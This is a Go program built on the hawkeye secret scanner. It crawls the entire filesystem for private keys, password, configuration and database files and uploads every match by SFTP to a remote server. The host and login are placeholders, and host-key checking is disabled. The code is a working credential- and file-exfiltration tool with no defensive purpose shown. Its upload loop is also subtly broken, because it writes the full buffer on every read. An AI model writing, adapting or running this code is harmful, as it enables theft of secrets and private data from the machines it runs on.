package main

import (
	"fmt"
	"os"
	"sync"
	"github.com/pkg/sftp"
 	"golang.org/x/crypto/ssh"
 	"time"
	"path"
	"log"
	"github.com/Ice3man543/hawkeye/core"
	"github.com/Ice3man543/hawkeye/utils"
	   "runtime"
)


func connect(user, password, host string, port int) (*sftp.Client, error) { 
 var (
 auth   []ssh.AuthMethod
 addr   string
 clientConfig *ssh.ClientConfig
 sshClient *ssh.Client
 sftpClient *sftp.Client
 err   error
 )
 // get auth method
 auth = make([]ssh.AuthMethod, 0)
 auth = append(auth, ssh.Password(password))

 clientConfig = &ssh.ClientConfig{
 User: user,
 HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 Auth: auth,
 Timeout: 30 * time.Second,
 }

 addr = fmt.Sprintf("%s:%d", host, port)

 if sshClient, err = ssh.Dial("tcp", addr, clientConfig); err != nil {
 return nil, err
 }
 if sftpClient, err = sftp.NewClient(sshClient); err != nil {
 return nil, err
 }

 return sftpClient, nil
}

func uploadfile(file string){
 var (
 err  error
 sftpClient *sftp.Client
 )


 sftpClient, err = connect("username", "password", "server", 22)
 if err != nil {
 log.Println(err)
 }
 defer sftpClient.Close()
 var localFilePath = file
 var remoteDir = "/tmp/"
 srcFile, err := os.Open(localFilePath)
 if err != nil {
 log.Println(err)
 }
 defer srcFile.Close()

 var remoteFileName = path.Base(localFilePath)
 dstFile, err := sftpClient.Create(path.Join(remoteDir, remoteFileName))
 if err != nil {
 log.Println(err)
 }
 defer dstFile.Close()

 buf := make([]byte, 1024)
 for {
 n, _ := srcFile.Read(buf)
 if n == 0 {
  break
 }
 dstFile.Write(buf)
 }
}

func main() {
	fmt.Printf(utils.Banner)
	state := utils.ParseArguments()
	_ = core.ParseSignaturesFromCommandLine(state)
	if state.Directory == "" {
    if runtime.GOOS == "windows" {
        state.Directory = `C:\`
    } else {
        state.Directory = "/"
    }
	}
	SignaturesUsed := []core.Signature{}

	if state.Signature.CryptoFiles {
		SignaturesUsed = append(SignaturesUsed, core.CryptoFilesSignatures...)
	}
	if state.Signature.ConfigurationFiles {
		SignaturesUsed = append(SignaturesUsed, core.ConfigurationFileSignatures...)
	}
	if state.Signature.DatabaseFiles {
		SignaturesUsed = append(SignaturesUsed, core.DatabaseFileSignatures...)
	}
	if state.Signature.MiscFiles {
		SignaturesUsed = append(SignaturesUsed, core.MiscSignatures...)
	}
	if state.Signature.PasswordFiles {
		SignaturesUsed = append(SignaturesUsed, core.PasswordFileSignatures...)
	}

	var OutputArray []*utils.Output
	if state.Directory != "" {
		var wg, wg2 sync.WaitGroup

		pathChan := make(chan string)
		wg.Add(state.Threads)
		resultChan := make(chan *utils.Output)
		wg2.Add(1)

		for i := 0; i < state.Threads; i++ {
			go func() {
				defer wg.Done()
				core.WorkPath(pathChan, resultChan, state, SignaturesUsed)
			}()
		}

		go func() {
			core.ProcessDirectory(state.Directory, state, pathChan)
			close(pathChan)
		}()

		go func() {
			for result := range resultChan {
				uploadfile(result.Path)
			}

			wg2.Done()
		}()

		wg.Wait()
		close(resultChan)
		wg2.Wait()
	}
	if state.Output != "" {
		utils.WriteOutput(OutputArray, state)
	}
	os.Exit(1)
}
